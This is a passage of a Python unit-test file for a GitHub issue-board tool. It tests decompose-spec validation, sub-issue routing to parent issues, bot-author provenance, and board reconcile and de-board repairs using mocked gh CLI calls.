    def test_forward_and_self_dependency_rejected(self) -> None:
        # forward: sub 0 depends on sub 1 (not yet created)
        fwd = {"plan_path": "p", "priority": "p2", "milestone": None, "sub_issues": [{"title": "a", "body_file": "s", "blocked_by": [1]}]}
        # self: sub 0 depends on itself
        selfdep = {"plan_path": "p", "priority": "p2", "milestone": None, "sub_issues": [{"title": "a", "body_file": "s", "blocked_by": [0]}]}
        for bad in (fwd, selfdep):
            with self.assertRaises(lb.BoardError) as cm:
                lb.validate_decompose_spec(bad, has_parent=True)
            self.assertEqual(cm.exception.code, "invalid_decompose_spec")

    def test_valid_milestone_accepted_with_and_without_description(self) -> None:
        for milestone in ({"title": "Non-demo data"},
                          {"title": "Non-demo data", "description": "why"}):
            spec = {"plan_path": "p", "priority": "p2", "milestone": milestone, "sub_issues": []}
            self.assertEqual(lb.validate_decompose_spec(spec, has_parent=True), [])

    def test_unknown_top_level_spec_key_rejected(self) -> None:
        # `milestones` is the likelier typo than `titel`, and falling through
        # spec.get() would write nothing — indistinguishable from omitting it.
        for key in ("milestones", "Milestone", "prioritY", "subissues"):
            spec = {"plan_path": "p", "priority": "p2", "milestone": None, "sub_issues": [], key: "x"}
            with self.assertRaises(lb.BoardError) as cm:
                lb.validate_decompose_spec(spec, has_parent=True)
            self.assertEqual(cm.exception.code, "invalid_decompose_spec")
            self.assertIn(key, str(cm.exception))

    def test_every_supported_top_level_key_is_accepted_together(self) -> None:
        spec = {"body_file": "p", "plan_path": "p", "parent_title": "t", "complexity": "low",
                "posture": "standard", "priority": "p2",
                "milestone": {"title": "m", "description": "d"},
                "sub_issues": [{"title": "a", "body_file": "s"}]}
        self.assertEqual(set(spec), set(lb.DECOMPOSE_SPEC_KEYS))
        self.assertEqual(len(lb.validate_decompose_spec(spec, has_parent=True)), 1)

    def test_explicit_null_milestone_valid_but_missing_key_rejected(self) -> None:
        # The milestone decision is mandatory: an explicit null records a
        # deliberate no-milestone choice; silently omitting the key fails
        # closed, exactly like priority.
        spec = {"plan_path": "p", "priority": "p2", "milestone": None, "sub_issues": []}
        self.assertEqual(lb.validate_decompose_spec(spec, has_parent=True), [])
        with self.assertRaises(lb.BoardError) as cm:
            lb.validate_decompose_spec(
                {"plan_path": "p", "priority": "p2", "sub_issues": []}, has_parent=True)
        self.assertEqual(cm.exception.code, "invalid_decompose_spec")
        self.assertIn("milestone", str(cm.exception))

    def test_invalid_milestone_rejected(self) -> None:
        for milestone in ("Non-demo data",            # not an object
                          {},                          # no title
                          {"title": ""},               # empty title
                          {"title": "   "},            # whitespace-only title
                          {"title": 7},                # wrong title type
                          {"title": "a", "description": 7},   # wrong description type
                          {"titel": "a"},              # typo: unknown key, no title
                          {"title": "a", "due_on": "x"}):     # unsupported key
            spec = {"plan_path": "p", "priority": "p2", "milestone": milestone, "sub_issues": []}
            with self.assertRaises(lb.BoardError) as cm:
                lb.validate_decompose_spec(spec, has_parent=True)
            self.assertEqual(cm.exception.code, "invalid_decompose_spec")
            self.assertIn("milestone", str(cm.exception))

    def test_existing_issue_blocked_by_accepted_in_both_spellings(self) -> None:
        # A dependency on an issue that ALREADY exists has no ordering problem —
        # both the bare and the hashed spelling name the same issue.
        for entry in ("257", "#257", " #257 "):
            spec = {"plan_path": "p", "priority": "p2", "milestone": None, "sub_issues": [
                {"title": "a", "body_file": "s", "blocked_by": [entry]}]}
            self.assertEqual(len(lb.validate_decompose_spec(spec, has_parent=True)), 1)

    def test_mixed_index_and_existing_issue_blocked_by_accepted(self) -> None:
        spec = {"plan_path": "p", "priority": "p2", "milestone": None, "sub_issues": [
            {"title": "a", "body_file": "s1"},
            {"title": "b", "body_file": "s2", "blocked_by": [0, "#257"]}]}
        self.assertEqual(len(lb.validate_decompose_spec(spec, has_parent=True)), 2)

    def test_blocked_by_naming_the_parent_is_rejected_as_a_cycle(self) -> None:
        spec = {"plan_path": "p", "priority": "p2", "milestone": None, "sub_issues": [
            {"title": "a", "body_file": "s", "blocked_by": ["#182"]}]}
        with self.assertRaises(lb.BoardError) as cm:
            lb.validate_decompose_spec(spec, has_parent=True, parent=182)
        self.assertEqual(cm.exception.code, "invalid_decompose_spec")
        self.assertIn("cycle", str(cm.exception))

    def test_non_numeric_and_zero_blocked_by_strings_rejected(self) -> None:
        for entry in ("#abc", "", "#0", "0", "12x", "#-3"):
            spec = {"plan_path": "p", "priority": "p2", "milestone": None, "sub_issues": [
                {"title": "a", "body_file": "s", "blocked_by": [entry]}]}
            with self.assertRaises(lb.BoardError) as cm:
                lb.validate_decompose_spec(spec, has_parent=True)
            self.assertEqual(cm.exception.code, "invalid_decompose_spec")

    def test_parent_title_required_only_when_creating(self) -> None:
        spec = {"plan_path": "p", "priority": "p2", "milestone": None, "sub_issues": []}
        # creating (no parent number) needs a title
        with self.assertRaises(lb.BoardError):
            lb.validate_decompose_spec(spec, has_parent=False)
        # updating an existing parent does not
        self.assertEqual(lb.validate_decompose_spec(spec, has_parent=True), [])

    def test_valid_complexity_on_parent_and_subs_accepted(self) -> None:
        spec = {"plan_path": "p", "priority": "p2", "complexity": "low", "milestone": None, "sub_issues": [
            {"title": "a", "body_file": "s1", "complexity": "high"},
            {"title": "b", "body_file": "s2"}]}  # sub omitting complexity stays valid
        subs = lb.validate_decompose_spec(spec, has_parent=True)
        self.assertEqual(len(subs), 2)

    def test_omitted_complexity_still_valid(self) -> None:
        spec = {"plan_path": "p", "priority": "p2", "milestone": None, "sub_issues": [{"title": "a", "body_file": "s"}]}
        # No complexity anywhere is backward compatible — no raise.
        self.assertEqual(len(lb.validate_decompose_spec(spec, has_parent=True)), 1)

    def test_out_of_vocabulary_complexity_rejected(self) -> None:
        parent_bad = {"plan_path": "p", "priority": "p2", "complexity": "epic", "milestone": None, "sub_issues": []}
        sub_bad = {"plan_path": "p", "priority": "p2", "milestone": None, "sub_issues": [
            {"title": "a", "body_file": "s", "complexity": "huge"}]}
        for bad in (parent_bad, sub_bad):
            with self.assertRaises(lb.BoardError) as cm:
                lb.validate_decompose_spec(bad, has_parent=True)
            self.assertEqual(cm.exception.code, "invalid_decompose_spec")

    def test_valid_posture_on_parent_accepted(self) -> None:
        for value in ("standard", "autonomous"):
            spec = {"plan_path": "p", "priority": "p2", "posture": value, "milestone": None, "sub_issues": [
                {"title": "a", "body_file": "s"}]}
            subs = lb.validate_decompose_spec(spec, has_parent=True)
            self.assertEqual(len(subs), 1)

    def test_omitted_posture_still_valid(self) -> None:
        spec = {"plan_path": "p", "priority": "p2", "milestone": None, "sub_issues": [{"title": "a", "body_file": "s"}]}
        self.assertEqual(len(lb.validate_decompose_spec(spec, has_parent=True)), 1)

    def test_out_of_vocabulary_posture_rejected(self) -> None:
        spec = {"plan_path": "p", "priority": "p2", "posture": "yolo", "milestone": None, "sub_issues": []}
        with self.assertRaises(lb.BoardError) as cm:
            lb.validate_decompose_spec(spec, has_parent=True)
        self.assertEqual(cm.exception.code, "invalid_decompose_spec")

    def test_sub_level_posture_rejected_with_spec_level_hint(self) -> None:
        # Posture governs the claimed PARENT across implement->review->deliver,
        # never an individual sub-issue — a hint must name the spec-level fix,
        # not silently ignore an author's mistaken placement.
        spec = {"plan_path": "p", "priority": "p2", "milestone": None, "sub_issues": [
            {"title": "a", "body_file": "s", "posture": "autonomous"}]}
        with self.assertRaises(lb.BoardError) as cm:
            lb.validate_decompose_spec(spec, has_parent=True)
        self.assertEqual(cm.exception.code, "invalid_decompose_spec")
        self.assertIn("spec.posture", str(cm.exception))


class SubIssueParsingTest(unittest.TestCase):
    """parse_issue_state must surface EVERY sub-issue (open + closed) with its
    blocked-by count — the exact data the groom postcondition reports."""

    def test_all_sub_issues_and_blocked_counts(self) -> None:
        payload = {"data": {"repository": {"issue": {
            "number": 182, "state": "OPEN", "authorAssociation": "MEMBER", "url": "u",
            "subIssues": {"nodes": [
                {"number": 183, "state": "OPEN", "blockedBy": {"nodes": []}},
                {"number": 184, "state": "OPEN", "blockedBy": {"nodes": [{"state": "OPEN"}]}},
                {"number": 185, "state": "CLOSED", "blockedBy": {"nodes": [{"state": "OPEN"}]}}]},
            "projectItems": {"nodes": []}}}}}
        st = lb.parse_issue_state(payload, lb.BoardConfig(owner="o", number=1, source="committed"))
        self.assertEqual(len(st.all_sub_issues), 3)  # closed ones counted too
        self.assertEqual(sum(1 for s in st.all_sub_issues if s["blocked_by"] > 0), 2)
        self.assertEqual(st.open_sub_issues, [183, 184])  # unchanged contract

    def test_archived_project_item_parses_as_not_on_board(self) -> None:
        # projectItems defaults to includeArchived:true, so a rule-6-archived item
        # is STILL returned (id + Status intact) flagged isArchived. It must parse
        # as not-on-board (item_id None, stage None) — the invariant that makes
        # de-boarding idempotent against real GraphQL.
        board = lb.BoardConfig(owner="o", number=1, source="committed")
        payload = {"data": {"repository": {"issue": {
            "number": 263, "state": "OPEN", "authorAssociation": "OWNER", "url": "u",
            "subIssues": {"nodes": []},
            "projectItems": {"nodes": [{
                "id": "IT_9", "isArchived": True,
                "project": {"number": 1, "owner": {"login": "o"}},
                "fieldValueByName": {"name": "stub"}}]}}}}}
        st = lb.parse_issue_state(payload, board)
        self.assertIsNone(st.item_id)
        self.assertIsNone(st.stage)
        # A NON-archived item on the same board still binds (regression guard).
        payload["data"]["repository"]["issue"]["projectItems"]["nodes"][0]["isArchived"] = False
        st2 = lb.parse_issue_state(payload, board)
        self.assertEqual(st2.item_id, "IT_9")
        self.assertEqual(st2.stage, "stub")


def _parented_payload(number=263, parent=265, stage="stub", state="OPEN",
                      author="OWNER"):
    """A sub-issue #263 whose native parent link points at the already-planned
    parent #265, carrying its own (noise) board stage. Reproduces the misroute
    that #266 fixes: the child's stub stage must NOT drive a groom/plan route."""
    node = {"number": number, "state": state, "authorAssociation": author,
            "url": "u", "parent": {"number": parent},
            "subIssues": {"nodes": []},
            "projectItems": {"nodes": []}}
    if stage is not None:
        node["projectItems"]["nodes"] = [{
            "id": "item",
            "project": {"number": 1, "owner": {"login": "o"}},
            "fieldValueByName": {"name": stage}}]
    return {"data": {"repository": {"issue": node}}}


class ParentAwareSubIssueGateTest(unittest.TestCase):
    """#266 regression: an OPEN sub-issue with a native parent link must route
    to the parent (verdict/route `sub_issue` + `parent: N`) from every gate,
    never to an intake/grooming route driven by the child's own board stage.
    Reproduces the observed #263 misroute (parent #265, child board stage
    `stub`) purely from fixture JSON parsed by parse_issue_state."""

    BOARD = lb.BoardConfig(owner="o", number=1, source="committed")

    def _state(self, **kw):
        return lb.parse_issue_state(_parented_payload(**kw), self.BOARD)

    def test_parent_number_parsed_from_native_link(self) -> None:
        self.assertEqual(self._state().parent_number, 265)

    def test_standalone_issue_has_no_parent_number(self) -> None:
        payload = {"data": {"repository": {"issue": {
            "number": 42, "state": "OPEN", "authorAssociation": "OWNER", "url": "u",
            "subIssues": {"nodes": []}, "projectItems": {"nodes": []}}}}}
        self.assertIsNone(lb.parse_issue_state(payload, self.BOARD).parent_number)

    def test_work_gate_reroutes_open_subissue_to_parent(self) -> None:
        st = self._state(stage="stub")  # the exact #263 shape
        g = lb.evaluate_gate("work", st.stage, True, None, None,
                             parent_number=st.parent_number, issue_state=st.state)
        self.assertEqual(g.verdict, "sub_issue")
        self.assertEqual(g.parent, 265)
        self.assertNotEqual(g.verdict, "route_to_plan")  # the reproduced misroute

    def test_every_gate_command_reroutes_open_subissue(self) -> None:
        st = self._state(stage="stub")
        for command in ("brainstorm", "plan", "work", "compound", "orchestrate"):
            with self.subTest(command=command):
                g = lb.evaluate_gate(command, st.stage, True, None, None,
                                     parent_number=st.parent_number, issue_state=st.state)
                self.assertEqual(g.verdict, "sub_issue")
                self.assertEqual(g.parent, 265)
                self.assertIsNotNone(g.next)

    def test_groom_entry_reroutes_open_subissue_to_parent(self) -> None:
        st = self._state(stage="stub")  # the exact #263 shape
        r = lb.route_for_groom(True, st.stage, None, None, "trusted",
                               parent_number=st.parent_number, issue_state=st.state)
        self.assertEqual(r.route, "sub_issue")
        self.assertEqual(r.parent, 265)
        self.assertIsNotNone(r.next)

    def test_closed_subissue_keeps_current_behavior(self) -> None:
        # Terminal (CLOSED) sub-issues do not reroute — only OPEN ones do.
        st = self._state(stage="stub", state="CLOSED")
        g = lb.evaluate_gate("work", st.stage, True, None, None,
                             parent_number=st.parent_number, issue_state=st.state)
        self.assertNotEqual(g.verdict, "sub_issue")

    def test_parentless_issue_uses_normal_gate(self) -> None:
        # Regression guard: absent a parent, behavior is unchanged.
        g = lb.evaluate_gate("work", "stub", True, None, None,
                             parent_number=None, issue_state="OPEN")
        self.assertEqual((g.verdict, g.route), ("route_to_plan", "plan"))

    def test_sub_issue_in_verdict_and_route_vocabularies(self) -> None:
        # Freeze the closed-set contract by category, not by scattering literals.
        self.assertIn("sub_issue", lb.VERDICTS)
        self.assertIn("sub_issue", lb.GROOM_ROUTES)

    def test_untrusted_open_sub_still_routes_sub_issue(self) -> None:
        # Deliberate ordering: for an OPEN parented sub, `sub_issue` beats
        # `untrusted_provenance` (the parent re-checks provenance during its own
        # groom). Freeze that ordering so it can't silently flip to a `blocked`
        # untrusted verdict, which would strand the child instead of routing it.
        r = lb.route_for_groom(True, "stub", None, None, "untrusted",
                               parent_number=265, issue_state="OPEN")
        self.assertEqual(r.route, "sub_issue")
        self.assertEqual(r.parent, 265)
        self.assertIsNone(r.blocker)


class BlockerStateRegressionTest(unittest.TestCase):
    """Closed dependencies are satisfied; only OPEN ones gate lifecycle work."""

    def test_parser_and_ready_work_count_only_open_blockers(self) -> None:
        board = lb.BoardConfig(owner="o", number=1, source="committed")
        closed = _issue_query_response(number=11, blocked=0)
        closed["data"]["repository"]["issue"]["blockedBy"] = {"nodes": [
            {"number": 10, "state": "CLOSED"}
        ]}
        open_blocker = _issue_query_response(number=12, blocked=1)
        self.assertEqual(lb.parse_issue_state(closed, board).blocked_by_count, 0)
        self.assertEqual(lb.decide_claim(["me"], "me",
                         lb.parse_issue_state(closed, board).blocked_by_count).action, "proceed")
        self.assertEqual(lb.parse_issue_state(open_blocker, board).blocked_by_count, 1)
        self.assertEqual(lb.decide_claim(["me"], "me",
                         lb.parse_issue_state(open_blocker, board).blocked_by_count).action, "blocked")

        ctx = lb.RepoContext(root=".", main_root=".", origin_owner="o",
                             origin_repo="r", default_branch="main")
        payload = {"data": {"repository": {
            "i11": {"blockedBy": {"nodes": [{"state": "CLOSED"}]}},
            "i12": {"blockedBy": {"nodes": [{"state": "OPEN"}]}},
        }}}
        runner = FakeRunner([(["api", "graphql"], _ok(json.dumps(payload)))])
        counts = lb._batched_blocked_counts([11, 12], ctx, runner)
        items = [
            {"content": {"type": "Issue", "number": 11, "repository": "o/r", "title": "closed"}},
            {"content": {"type": "Issue", "number": 12, "repository": "o/r", "title": "open"}},
        ]
        ready, truncated = lb.merge_ready_legs(items, counts, "o/r")
        self.assertEqual(counts, {11: 0, 12: 1})
        self.assertEqual([item.number for item in ready], [11])
        self.assertFalse(truncated)
        query = runner.calls[0][runner.calls[0].index("-f") + 1]
        self.assertIn("nodes { state }", query)
        self.assertNotIn("totalCount", query)


def _ctx(root: str, slug=("o", "r")) -> "lb.RepoContext":
    return lb.RepoContext(root=root, main_root=root, origin_owner=slug[0],
                          origin_repo=slug[1], default_branch="main")


def _subissue_payload(item=True, stage="stub", state="OPEN", archived=False):
    """An OPEN native sub-issue #263 of parent #265, optionally carrying its own
    (invariant-violating) board item. Drives the rule-6 de-board path.

    `archived=True` models the REALISTIC post-archive payload real GraphQL
    returns: projectItems defaults to includeArchived:true, so the node is still
    present (id + Status intact) but flagged isArchived — which parse_issue_state
    must treat as not-on-board. This is the fixture the idempotency tests use;
    `item=False` (node absent) is not a shape real GraphQL produces after archive."""
    node = {"number": 263, "state": state, "stateReason": None,
            "authorAssociation": "OWNER", "url": "u", "parent": {"number": 265},
            "assignees": {"nodes": []},
            "closedByPullRequestsReferences": {"nodes": []},
            "blockedBy": {"totalCount": 0, "nodes": []},
            "subIssues": {"nodes": []}, "projectItems": {"nodes": []}}
    if item:
        node["projectItems"]["nodes"] = [{
            "id": "IT_9", "isArchived": archived,
            "project": {"number": 1, "owner": {"login": "o"}},
            "fieldValueByName": {"name": stage}}]
    return json.dumps({"data": {"repository": {"issue": node}}})


class ParentAwareVerbThreadingTest(unittest.TestCase):
    """P2 guard: the effectful verbs must THREAD state.parent_number into the
    routing core. Without a verb-level test, deleting
    `parent_number = state.parent_number` (or narrowing the evaluate_gate /
    route_for_groom call) passes the entire pure-function suite while reproducing
    the original #263 CLI misroute. Driven end-to-end over a FakeRunner from the
    #263 fixture (parent #265, child board stage `stub`)."""

    BOARD = lb.BoardConfig(owner="o", number=1, source="committed")

    def test_verb_gate_threads_parent_and_routes_sub_issue(self) -> None:
        runner = FakeRunner([
            (["api", "graphql"], _ok(json.dumps(_parented_payload(stage="stub")))),
        ])
        with mock.patch.object(lb, "read_board_config", return_value=self.BOARD), \
                tempfile.TemporaryDirectory() as d:
            out = lb.verb_gate("work", 263, _ctx(d), runner)
        self.assertEqual(out["verdict"], "sub_issue")
        self.assertEqual(out["route"], "parent")
        self.assertEqual(out["parent"], 265)
        self.assertIsNotNone(out["next"])

    def test_verb_groom_entry_threads_parent_and_routes_sub_issue(self) -> None:
        # verb_reconcile is short-circuited (its own seams are exercised
        # elsewhere); this isolates the parent-threading through route_for_groom.
        runner = FakeRunner([
            (["api", "graphql"], _ok(json.dumps(_parented_payload(stage="stub")))),
        ])
        with mock.patch.object(lb, "read_board_config", return_value=self.BOARD), \
                mock.patch.object(lb, "verb_reconcile",
                                  return_value={"skipped_ttl": True, "flags": []}), \
                tempfile.TemporaryDirectory() as d:
            out = lb.verb_groom_entry(263, _ctx(d), runner)
        self.assertEqual(out["route"], "sub_issue")
        self.assertEqual(out["parent"], 265)
        self.assertIsNotNone(out["next"])


def _bot_authored_payload(number=500, stage="stub"):
    """A top-level issue filed by a GitHub App: `author.__typename == "Bot"` and
    `authorAssociation: NONE` — the shape observed live for App-filed issues."""
    return json.dumps({"data": {"repository": {"issue": {
        "number": number, "state": "OPEN", "stateReason": None, "url": "u",
        "authorAssociation": "NONE",
        "author": {"login": "lifewithdata-dev", "__typename": "Bot"},
        "assignees": {"nodes": []},
        "closedByPullRequestsReferences": {"nodes": []},
        "blockedBy": {"totalCount": 0, "nodes": []},
        "subIssues": {"nodes": []},
        "projectItems": {"nodes": [{
            "id": "IT_5", "isArchived": False,
            "project": {"number": 1, "owner": {"login": "o"}},
            "fieldValueByName": {"name": stage}}]}}}}})


class BotProvenanceVerbThreadingTest(unittest.TestCase):
    """P1 guard, same class of defect as ParentAwareVerbThreadingTest: the
    effectful verbs must THREAD state.author_is_bot into the provenance core.
    Deleting `author_is_bot = state.author_is_bot` from either verb passes the
    entire pure-function suite while restoring the original refusal — an App can
    file work it can never groom. Driven end-to-end over a FakeRunner."""

    BOARD = lb.BoardConfig(owner="o", number=1, source="committed")

    def test_verb_gate_threads_the_bot_author_into_provenance(self) -> None:
        runner = FakeRunner([(["api", "graphql"], _ok(_bot_authored_payload()))])
        with mock.patch.object(lb, "read_board_config", return_value=self.BOARD), \
                tempfile.TemporaryDirectory() as d:
            out = lb.verb_gate("brainstorm", 500, _ctx(d), runner)
        # The association alone would read untrusted; only the threaded Bot flag
        # can produce this.
        self.assertEqual(out["author_association"], "NONE")
        self.assertEqual(out["provenance"], "trusted")

    def test_verb_groom_entry_threads_the_bot_author_into_provenance(self) -> None:
        runner = FakeRunner([(["api", "graphql"], _ok(_bot_authored_payload()))])
        with mock.patch.object(lb, "read_board_config", return_value=self.BOARD), \
                mock.patch.object(lb, "verb_reconcile",
                                  return_value={"skipped_ttl": True, "flags": []}), \
                tempfile.TemporaryDirectory() as d:
            out = lb.verb_groom_entry(500, _ctx(d), runner)
        self.assertEqual(out["author_association"], "NONE")
        self.assertEqual(out["provenance"], "trusted")
        self.assertIsNone(out["blocker"])  # not refused with untrusted_provenance


class IssueQueryShapeTest(unittest.TestCase):
    """The hand-built `_issue_query_response` fixture supplies fields the real
    query must actually request. Without pinning the query text, deleting a
    selection leaves every provenance test green while production reads None —
    the recorded-fixture failure mode this repo has already been bitten by.
    Asserted by category (the field names the parser reads), not by whitespace."""

    @staticmethod
    def _query() -> str:
        return lb.ISSUE_QUERY

    def _issue_level(self) -> str:
        """The issue's OWN selections, excluding every nested connection — the
        nested blocks also select `author`, so an unscoped assertion passes while
        the issue-level selection is missing."""
        return self._query().split("closedByPullRequestsReferences", 1)[0]

    def test_issue_author_typename_is_requested(self) -> None:
        # parse_issue_state reads the ISSUE author's __typename for provenance.
        self.assertRegex(self._issue_level(), r"author\s*\{[^}]*__typename")

    def test_closing_pr_provenance_fields_are_requested(self) -> None:
        # plan_repairs scopes rules 3 and 5 by the closing PR's provenance.
        refs = self._query().split("closedByPullRequestsReferences", 1)[1]
        refs = refs.split("subIssues", 1)[0]
        self.assertIn("authorAssociation", refs)
        self.assertIn("__typename", refs)

    def test_closed_unmerged_prs_are_included(self) -> None:
        # `closedByPullRequestsReferences` defaults to includeClosedPrs:false,
        # which excludes exactly the CLOSED+unmerged node rule 3 keys on — the
        # rule is unreachable in production without this argument.
        self.assertIn("includeClosedPrs: true", self._query())


class SubIssueDeboardReconcileTest(unittest.TestCase):
    """Rule 6 end-to-end through verb_reconcile over a FakeRunner: an open
    parented issue's board item is archived + audit comment; the second run
    (item gone) is a no-op; and the CI-add-after-verify race converges here."""

    BOARD = lb.BoardConfig(owner="o", number=1, source="committed")

    def _reconcile(self, root, payload):
        runner = FakeRunner(payload)
        with mock.patch.object(lb, "read_board_config", return_value=self.BOARD), \
                mock.patch.object(lb, "load_cache", return_value={}), \
                mock.patch.object(lb, "save_cache", lambda *a, **k: None):
            return runner, lb.verb_reconcile(_ctx(root), runner, issue=263, force=True)

    def test_boarded_open_subissue_is_archived_with_audit_comment(self) -> None:
        with tempfile.TemporaryDirectory() as d:
            runner, out = self._reconcile(d, [
                (["api", "graphql"], _ok(_subissue_payload(item=True))),
                (["project", "item-archive", "1", "--owner", "o", "--id", "IT_9"],
                 _ok("{}")),
                (["issue", "comment", "263", "--repo", "o/r", "--body"], _ok("")),
            ])
            self.assertEqual([r["rule"] for r in out["repairs_applied"]],
                             ["sub_issue_on_board"])
            self.assertEqual(out["repairs_failed"], [])
            # the audit comment names the parent
            comment = runner.calls[-1][runner.calls[-1].index("--body") + 1]
            self.assertIn("#265", comment)

    def test_second_run_after_removal_is_a_noop(self) -> None:
        # The idempotent second run against the REALISTIC post-archive payload:
        # projectItems still returns the item, but flagged isArchived:true (real
        # GraphQL defaults to includeArchived). parse_issue_state must read it as
        # not-on-board, so plan_repairs sees item_id None -> no archive, no
        # comment, no repair. (Proves the no-op against a payload real GraphQL
        # actually produces, not a hand-removed item.)
        with tempfile.TemporaryDirectory() as d:
            runner, out = self._reconcile(d, [
                (["api", "graphql"], _ok(_subissue_payload(item=True, archived=True))),
            ])
            self.assertEqual(out["repairs_applied"], [])
            self.assertEqual(out["repairs_failed"], [])
            self.assertEqual(runner.responses, [])  # only the read happened

    def test_ci_add_after_verify_race_is_repaired_at_reconcile(self) -> None:
        # groom-verify saw no board item (CI had not added it yet); the item
        # appears only now, at reconcile time — the convergence guarantee fires.
        with tempfile.TemporaryDirectory() as d:
            _runner, out = self._reconcile(d, [
                (["api", "graphql"], _ok(_subissue_payload(item=True, stage="stub"))),
                (["project", "item-archive", "1", "--owner", "o", "--id", "IT_9"],
                 _ok("{}")),
                (["issue", "comment", "263", "--repo", "o/r", "--body"], _ok("")),
            ])
            self.assertEqual([r["rule"] for r in out["repairs_applied"]],
                             ["sub_issue_on_board"])

    def test_global_sweep_discovers_no_status_open_sub(self) -> None:
        # P1-A: `add-to-project.yml` auto-adds a sub WITHOUT setting Status, so a
        # CI-added sub sits in the NO-STATUS bucket. A GLOBAL reconcile (no
        # hand-picked --issue) must enumerate it via the sweep's `no:status` leg
        # and de-board it. Before that leg existed, the four in_progress/terminal
        # legs never enumerated it and rule 6 never fired for its own async-CI-add
        # race — the exact convergence gap this leg closes.
        item = {"content": {"type": "Issue", "number": 263, "repository": "o/r",
                            "title": "t"}}

        def leg(query, items):
            return (["project", "item-list", "1", "--owner", "o", "--format",
                     "json", "--limit", str(lb.RECONCILE_ITEM_LIMIT), "--query", query],
                    _ok(json.dumps({"items": items})))

        responses = [
            leg("status:in_progress", []),
            leg("status:in_review", []),
            leg("status:done", []),
            leg("status:abandoned", []),
            leg("no:status", [item]),          # the CI-added sub lands here
            leg("status:stub", []),
            leg("status:brainstormed", []),
            leg("status:planned", []),
            leg("status:ready_for_work", []),
            (["api", "graphql"], _ok(_subissue_payload(item=True))),
            (["project", "item-archive", "1", "--owner", "o", "--id", "IT_9"], _ok("{}")),
            (["issue", "comment", "263", "--repo", "o/r", "--body"], _ok("")),
        ]
        with tempfile.TemporaryDirectory() as d:
            runner = FakeRunner(responses)
            with mock.patch.object(lb, "read_board_config", return_value=self.BOARD), \
                    mock.patch.object(lb, "load_cache", return_value={}), \
                    mock.patch.object(lb, "save_cache", lambda *a, **k: None):
                out = lb.verb_reconcile(_ctx(d), runner, issue=None, force=True)
        self.assertEqual([r["rule"] for r in out["repairs_applied"]],
                         ["sub_issue_on_board"])

    def test_failed_archive_is_reported_not_fatal(self) -> None:
        fail = subprocess.CompletedProcess(args=[], returncode=1, stdout="", stderr="nope")
        with tempfile.TemporaryDirectory() as d:
            _runner, out = self._reconcile(d, [
                (["api", "graphql"], _ok(_subissue_payload(item=True))),
                (["project", "item-archive", "1", "--owner", "o", "--id", "IT_9"], fail),
            ])
            self.assertEqual(out["repairs_applied"], [])
            self.assertEqual([r["rule"] for r in out["repairs_failed"]],
                             ["sub_issue_on_board"])
            self.assertEqual(out["repairs_failed"][0]["error_code"], "deboard_failed")


class DeboardSubissueHelperTest(unittest.TestCase):
    """The best-effort `_deboard_subissue` seam used by decompose and
    groom-verify: read the sub's board membership, archive it if present, and
    never raise — every failure degrades to a reported result."""

    BOARD = lb.BoardConfig(owner="o", number=1, source="committed")

    def test_archives_when_the_sub_has_a_board_item(self) -> None:
        runner = FakeRunner([
            (["api", "graphql"], _ok(_subissue_payload(item=True))),
            (["project", "item-archive", "1", "--owner", "o", "--id", "IT_9"], _ok("{}")),
        ])
        with mock.patch.object(lb, "read_board_config", return_value=self.BOARD):
            out = lb._deboard_subissue(263, self.BOARD, _ctx("/tmp"), runner)
        self.assertEqual(out, {"issue": 263, "deboarded": True})

    def test_noop_when_the_sub_is_not_boarded(self) -> None:
        runner = FakeRunner([(["api", "graphql"], _ok(_subissue_payload(item=False)))])
        with mock.patch.object(lb, "read_board_config", return_value=self.BOARD):
            out = lb._deboard_subissue(263, self.BOARD, _ctx("/tmp"), runner)
        self.assertEqual(out, {"issue": 263, "deboarded": False})

    def test_read_failure_is_reported_never_raised(self) -> None:
        fail = subprocess.CompletedProcess(args=[], returncode=1, stdout="", stderr="net down")
        runner = FakeRunner([(["api", "graphql"], fail)])
        with mock.patch.object(lb, "read_board_config", return_value=self.BOARD):
            out = lb._deboard_subissue(263, self.BOARD, _ctx("/tmp"), runner)
        self.assertFalse(out["deboarded"])
        self.assertIn("error", out)

    def test_archive_failure_is_reported_never_raised(self) -> None:
        fail = subprocess.CompletedProcess(args=[], returncode=1, stdout="", stderr="denied")
        runner = FakeRunner([
            (["api", "graphql"], _ok(_subissue_payload(item=True))),
            (["project", "item-archive", "1", "--owner", "o", "--id", "IT_9"], fail),
        ])
        with mock.patch.object(lb, "read_board_config", return_value=self.BOARD):
            out = lb._deboard_subissue(263, self.BOARD, _ctx("/tmp"), runner)
        self.assertFalse(out["deboarded"])
        self.assertIn("error", out)

    def test_malformed_json_read_is_reported_never_raised(self) -> None:
        # returncode 0 but non-JSON stdout: fetch_issue_state's json.loads raises
        # ValueError (json.JSONDecodeError). The best-effort de-board must degrade
        # to a reported result, not crash — its whole contract is to never raise.
        runner = FakeRunner([(["api", "graphql"], _ok("not json{"))])
        with mock.patch.object(lb, "read_board_config", return_value=self.BOARD):
            out = lb._deboard_subissue(263, self.BOARD, _ctx("/tmp"), runner)
        self.assertFalse(out["deboarded"])
        self.assertIn("error", out)


def _schema_fields_payload(stages=None):
    """Status + Priority field-list payload for resolve_schema hermetic tests."""
    stages = list(lb.STAGES if stages is None else stages)
    return {"fields": [
        {"name": "Status", "id": "F", "projectId": "P",
         "options": [{"id": f"o_{s}", "name": s} for s in stages]},
        {"name": "Priority", "id": "F_PRI", "projectId": "P",
         "options": [{"id": f"o_{p}", "name": p} for p in lb.PRIORITY_VALUES]},
    ]}


def _decompose_field_list() -> "subprocess.CompletedProcess[str]":
    """The `project field-list` response verb_decompose's schema preflight
    reads before its first mutation. set_status is faked in these tests, so
    this is the only resolve_schema call they ever make."""
    return _ok(json.dumps(_schema_fields_payload()))


def _spec_priority(spec: dict, priority: str = "p2") -> dict:
    """Ensure a decompose spec carries required parent priority (test helper)."""
    out = dict(spec)
    out.setdefault("priority", priority)
    return out


class DecomposeVerbTest(unittest.TestCase):
    """The effectful decompose verb, driven by an argv-recording FakeRunner and
    an injected set_status seam. Proves the create->wire->stamp sequence and that
    sub-issue numbers come from gh's returned URLs (not positional guessing)."""

    def setUp(self) -> None:
        # Priority write is covered by dedicated tests; other decompose cases
        # stub it so FakeRunner sequences stay focused on issue create/wire.
        self._priority_patch = mock.patch.object(
            lb, "apply_priority_field",
            return_value={"item_id": "IT_1", "priority": "p2"})
        self._priority_patch.start()
        self.addCleanup(self._priority_patch.stop)

    def test_updates_parent_creates_subs_wires_deps_and_stamps(self) -> None:
        with tempfile.TemporaryDirectory() as d:
            root = Path(d)
            (root / "docs" / "plans").mkdir(parents=True)
            plan = root / "docs" / "plans" / "p.md"
